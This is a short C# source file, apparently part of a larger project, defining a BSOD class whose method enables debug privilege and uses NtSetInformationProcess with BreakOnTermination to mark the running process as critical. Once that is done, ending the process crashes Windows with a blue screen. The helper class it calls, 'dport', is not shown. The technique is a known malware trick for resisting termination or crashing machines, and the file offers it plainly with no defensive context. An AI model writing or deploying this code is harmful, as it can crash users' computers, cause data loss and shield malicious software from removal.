using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;

namespace AlexRealm
{
    public class BSOD
    {
        public static void bsod_start()
        {
            Process.EnterDebugMode();
            dport.NtSetInformationProcess(Process.GetCurrentProcess().Handle, dport.BreakOnTermination, ref dport.isCritical, sizeof(int));
        }
    }
}